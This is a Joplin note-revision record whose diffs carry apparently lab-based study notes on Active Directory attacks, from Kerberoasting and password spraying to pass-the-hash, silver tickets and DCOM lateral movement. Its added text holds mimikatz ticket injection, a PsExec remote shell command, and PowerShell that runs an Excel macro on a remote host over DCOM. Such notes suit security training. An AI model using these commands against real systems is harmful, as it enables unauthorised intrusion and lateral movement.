id: 442bf0c33d434bd1bcbbe07c2063f54b
parent_id: 953a1e4c998245228273a9b83ba909c8
item_type: 1
item_id: 07865553b30a4727ac88b108b5e909ef
item_updated_time: 1643596361777
title_diff: "[{\"diffs\":[[0,\" Attacks\"],[1,\"\\\r\"]],\"start1\":2,\"start2\":2,\"length1\":8,\"length2\":9}]"
body_diff: "[{\"diffs\":[[0,\" Attacks\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nWhen re\"]],\"start1\":17,\"start2\":17,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\" by SPN.\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nChecks \"]],\"start1\":140,\"start2\":140,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"stablish\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n- If we\"]],\"start1\":211,\"start2\":211,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\" from DC\"],[1,\"\\\r\"],[0,\"\\\n- Since\"]],\"start1\":283,\"start2\":283,\"length1\":16,\"length2\":17},{\"diffs\":[[0,\" to disk\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nOnce we\"]],\"start1\":369,\"start2\":369,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"e ticket\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n> Add-T\"]],\"start1\":472,\"start2\":472,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"ityModel\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n> New-O\"]],\"start1\":521,\"start2\":521,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"orp.com'\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nCalling\"]],\"start1\":640,\"start2\":640,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\" client.\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n## Get \"]],\"start1\":756,\"start2\":756,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"s ticket\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n> In mi\"]],\"start1\":793,\"start2\":793,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\" to disk\"],[1,\"\\\r\"],[0,\"\\\n> \"],[1,\"\\\r\"],[0,\"\\\n> If on\"]],\"start1\":872,\"start2\":872,\"length1\":19,\"length2\":21},{\"diffs\":[[0,\"se klist\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n![1b7e5\"]],\"start1\":908,\"start2\":908,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"a5dff33)\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n## Crac\"]],\"start1\":987,\"start2\":987,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"oasting)\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n![367e7\"]],\"start1\":1074,\"start2\":1074,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"9539787)\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n> pytho\"]],\"start1\":1153,\"start2\":1153,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"file&gt;\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n![0d936\"]],\"start1\":1253,\"start2\":1253,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"541ab71)\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nWe can \"]],\"start1\":1332,\"start2\":1332,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"me thing\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nThis te\"]],\"start1\":1392,\"start2\":1392,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"ERFUL if\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n- Domai\"]],\"start1\":1430,\"start2\":1430,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\" common)\"],[1,\"\\\r\"],[0,\"\\\n- (Grou\"]],\"start1\":1518,\"start2\":1518,\"length1\":16,\"length2\":17},{\"diffs\":[[0,\"se days)\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n![cf1a0\"]],\"start1\":1654,\"start2\":1654,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"a215c09)\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n# Low a\"]],\"start1\":1733,\"start2\":1733,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"Guessing\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nFor sce\"]],\"start1\":1769,\"start2\":1769,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\" account\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nWill us\"]],\"start1\":1847,\"start2\":1847,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\" lockout\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nDomain'\"]],\"start1\":1932,\"start2\":1932,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"accounts\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n![314c3\"]],\"start1\":1993,\"start2\":1993,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"095d0b3)\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nWe can \"]],\"start1\":2072,\"start2\":2072,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"ponents.\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nUse the\"]],\"start1\":2145,\"start2\":2145,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"login to\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n```Powe\"]],\"start1\":2259,\"start2\":2259,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"wershell\"],[1,\"\\\r\"],[0,\"\\\n$domain\"]],\"start1\":2276,\"start2\":2276,\"length1\":16,\"length2\":17},{\"diffs\":[[0,\"Domain()\"],[1,\"\\\r\"],[0,\"\\\n$PDC = \"]],\"start1\":2360,\"start2\":2360,\"length1\":16,\"length2\":17},{\"diffs\":[[0,\"er).Name\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n$Search\"]],\"start1\":2399,\"start2\":2399,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"LDAP://\\\"\"],[1,\"\\\r\"],[0,\"\\\n$Search\"]],\"start1\":2428,\"start2\":2428,\"length1\":16,\"length2\":17},{\"diffs\":[[0,\"DC + \\\"/\\\"\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n$Distin\"]],\"start1\":2457,\"start2\":2457,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\",DC='))\\\"\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n$Search\"]],\"start1\":2523,\"start2\":2523,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"uishName\"],[1,\"\\\r\"],[0,\"\\\nNew-Obj\"]],\"start1\":2560,\"start2\":2560,\"length1\":16,\"length2\":17},{\"diffs\":[[0,\"9!\\\")\"],[1,\"\\\r\"],[0,\"\\\n```\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n![9\"]],\"start1\":2656,\"start2\":2656,\"length1\":13,\"length2\":16},{\"diffs\":[[0,\"801a5e3)\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nYou can\"]],\"start1\":2736,\"start2\":2736,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"ate it )\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n# Later\"]],\"start1\":2819,\"start2\":2819,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"Movement\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nUsing o\"]],\"start1\":2841,\"start2\":2841,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"s ticket\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nPass-th\"]],\"start1\":2899,\"start2\":2899,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"h-winexe\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n## Over\"]],\"start1\":2933,\"start2\":2933,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"the hash\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n\\\"Over\\\" \"]],\"start1\":2957,\"start2\":2957,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"h-winexe\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nIn mimi\"]],\"start1\":3053,\"start2\":3053,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"mimikatz\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n> sekur\"]],\"start1\":3068,\"start2\":3068,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"hell.exe\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nOnce we\"]],\"start1\":3164,\"start2\":3164,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"th klist\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nIf no t\"]],\"start1\":3220,\"start2\":3220,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"re on DC\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n> net u\"]],\"start1\":3317,\"start2\":3317,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"dc01\"],[1,\"\\\r\"],[0,\"\\\n> \"],[1,\"\\\r\"],[0,\"\\\n> klist\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n![3\"]],\"start1\":3342,\"start2\":3342,\"length1\":20,\"length2\":24},{\"diffs\":[[0,\"a00557a)\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nWith th\"]],\"start1\":3430,\"start2\":3430,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"ts auth.\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n**Obtai\"]],\"start1\":3500,\"start2\":3500,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"sExec)**\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n> ./PsE\"]],\"start1\":3554,\"start2\":3554,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\" cmd.exe\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n## Pass\"]],\"start1\":3588,\"start2\":3588,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"e-Ticket\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nTakes a\"]],\"start1\":3610,\"start2\":3610,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"service.\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nSuitabl\"]],\"start1\":3751,\"start2\":3751,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"methods.\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n- Does \"]],\"start1\":3849,\"start2\":3849,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"ket from\"],[1,\"\\\r\"],[0,\"\\\n- If a \"]],\"start1\":3945,\"start2\":3945,\"length1\":16,\"length2\":17},{\"diffs\":[[0,\" methods\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nUser an\"]],\"start1\":4053,\"start2\":4053,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"e ticket\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n- Forge\"]],\"start1\":4198,\"start2\":4198,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"Ticket**\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n![b2722\"]],\"start1\":4313,\"start2\":4313,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"5549a62)\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nWe can \"]],\"start1\":4392,\"start2\":4392,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"y using:\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n> whoam\"]],\"start1\":4431,\"start2\":4431,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"mi /user\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n![5d5e2\"]],\"start1\":4449,\"start2\":4449,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"f381854)\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n![8faa7\"]],\"start1\":4528,\"start2\":4528,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"651b50c)\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nMethod \"]],\"start1\":4607,\"start2\":4607,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"Mimikatz\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n> kerbe\"]],\"start1\":4649,\"start2\":4649,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"s::purge\"],[1,\"\\\r\"],[0,\"\\\n> \"],[1,\"\\\r\"],[0,\"\\\n> kerbe\"]],\"start1\":4670,\"start2\":4670,\"length1\":19,\"length2\":21},{\"diffs\":[[0,\"is empty\"],[1,\"\\\r\"],[0,\"\\\n> \"],[1,\"\\\r\"],[0,\"\\\n> kerbe\"]],\"start1\":4716,\"start2\":4716,\"length1\":19,\"length2\":21},{\"diffs\":[[0,\"25e /ptt\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n/rc4: t\"]],\"start1\":4905,\"start2\":4905,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\" account\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\n![9fc60\"]],\"start1\":4967,\"start2\":4967,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"4f4c851)\"],[-1,\"\\\n\"],[1,\"\\\r\\\n\\\r\"],[0,\"\\\nhttps:/\"]],\"start1\":5046,\"start2\":5046,\"length1\":17,\"length2\":19},{\"diffs\":[[0,\"ckets.md\"],[1,\"\\\r\\\n\\\r\\\nAs follow up steps, we should inject the ticket into the memory and obtain a shell in the server we want to move to\\\r\\\n\\\r\\\n> mimikatz # kerberos::ptt &lt;ticket\\\\_kirbi\\\\_file&gt;\\\r\\\n> \\\r\\\n> CMD # .\\\\PsExec.exe -accepteula \\\\\\\\\\\\labwws02.jurassic.park cmd\\\r\\\n\\\r\\\nhttps://book.hacktricks.xyz/windows/active-directory-methodology/silver-ticket \\\r\\\n\\\r\\\n## DCOM (Distributed Component Object Model)\\\r\\\n\\\r\\\n![eacbf526701e8e59c1c68f4135a16115.png](:/356f1d18b595411893837bd94518826a)\\\r\\\n\\\r\\\nMust install Microsoft Office to work\\\r\\\n\\\r\\\n![e14ca8cd90ebfe9df26a40ef243c7a40.png](:/0b09b2488a1847279bd93cf3e68d5a79)\\\r\\\n\\\r\\\n![2740720923bf93debf65acfab719f817.png](:/654a3d7ad75d42a7a27311a43ae3d8a5)\\\r\\\n\\\r\\\nThis error occurs because Excel.Application is instantiated through DCOM, which is done with SYSTEM account\\\r\\\n\\\r\\\nSYSTEM does not have a profile. To fix this problem, we can simply create the Desktop folder at C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\config\\\\\\\\systemprofile\\\r\\\n\\\r\\\nCreate the directory with the following PowerShell code:\\\r\\\n\\\r\\\n> $Path = \\\"[\\\\\\\\\\\\192.168.1.110\\\\\\\\c$\\\\\\\\Windows\\\\\\\\sysWOW64\\\\\\\\config\\\\\\\\systemprofile\\\\\\\\Desktop](file:///\\\\\\\\192.168.1.110\\\\c$\\\\Windows\\\\sysWOW64\\\\config\\\\systemprofile\\\\Desktop)\\\"\\\r\\\n\\\r\\\n> $temp = \\\\[system.io.directory\\\\]::createDirectory($Path)\\\r\\\n\\\r\\\nCalling the Open method again should now succeed. We can then call the Run method with the following script:\\\r\\\n\\\r\\\n> $com = \\\\[activator\\\\]::CreateInstance(\\\\[type\\\\]::GetTypeFromProgId(\\\"Excel.Application\\\", \\\"192 .168.1.110\\\"))\\\r\\\n\\\r\\\n> $LocalPath = \\\"C:\\\\\\\\Users\\\\\\\\jeff_admin.corp\\\\\\\\myexcel.xls\\\"\\\r\\\n> \\\r\\\n> $RemotePath = \\\"[\\\\\\\\\\\\192.168.1.110\\\\\\\\c$\\\\\\\\myexcel.xls](file:///\\\\\\\\192.168.1.110\\\\c$\\\\myexcel.xls)\\\" \\\\[System.IO.File\\\\]::Copy($LocalPath, $RemotePath, $True)\\\r\\\n> \\\r\\\n> $Path = \\\"[\\\\\\\\\\\\192.168.1.110\\\\\\\\c$\\\\\\\\Windows\\\\\\\\sysWOW64\\\\\\\\config\\\\\\\\systemprofile\\\\\\\\Desktop](file:///\\\\\\\\192.168.1.110\\\\c$\\\\Windows\\\\sysWOW64\\\\config\\\\systemprofile\\\\Desktop)\\\" $temp = \\\\[system.io.directory\\\\]::createDirectory($Path)\\\r\\\n> \\\r\\\n> $Workbook = $com.Workbooks.Open(\\\"C:\\\\\\\\myexcel.xls\\\") $com.Run(\\\"mymacro\\\")\\\r\\\n\\\r\\\nThis code should open the Notepad application as a background process executing in a high integrity context on the remote machine\\\r\\\n\\\r\\\n![5307d353cd314b401df7b8194ae1ff6a.png](:/e601279c1971474a9fffec016c8c44b8)\\\r\"]],\"start1\":5215,\"start2\":5215,\"length1\":8,\"length2\":2151}]"
metadata_diff: {"new":{},"deleted":[]}
encryption_cipher_text: 
encryption_applied: 0
updated_time: 2022-04-22T04:06:57.730Z
created_time: 2022-04-22T04:06:57.730Z
type_: 13